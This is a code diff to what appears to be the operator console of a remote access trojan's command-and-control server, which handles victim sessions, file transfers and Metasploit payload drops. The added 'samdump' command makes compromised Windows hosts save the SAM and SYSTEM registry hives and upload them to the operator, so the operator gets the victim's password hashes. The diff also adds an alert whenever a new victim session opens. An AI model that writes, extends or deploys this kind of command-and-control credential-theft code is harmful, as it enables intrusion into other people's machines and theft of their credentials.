@@ -612,8 +612,6 @@ Open Ports
                     filetransfer()
                     time.sleep(2)
 
-                
-                    
                 elif(main == "download"):
                     filename = input("[+] File : ")
                     if(len(filename) > 0):
@@ -637,7 +635,18 @@ Open Ports
                     
                 elif(main == "help"):
                     print(help)
-                
+
+                elif(main == "samdump"):
+                    print("[+] Dumping contents of SAM Database to file. (Note : This may fail if Fhdawn does not have administrator privileges)")
+                    self.SendData("cmd.exe /c reg save hklm\sam sam")
+                    self.WaitForReply()
+                    self.SendData("cmd.exe /c reg save hklm\system system")
+                    self.WaitForReply()
+                    self.SendData("fupload:sam")
+                    self.WaitForReply()
+                    self.SendData("fupload:system")
+                    self.WaitForReply()
+
                 elif(main == "dropmsf"):
                     os.chdir("payloads")
                     build_msf_dll()
@@ -990,6 +999,7 @@ def TCPServer():
         hostList.append(host)
         print( Style.BRIGHT + Fore.GREEN + "\n[ Session Opened ] " + Style.RESET_ALL + cld.returnClientInfo())
         _thread.start_new_thread(cld.ClientThread, ())
+        notify("New Session Opened", "A New session has opened to : " + client_ip + " on Host " + host)
 
 
 def Console():
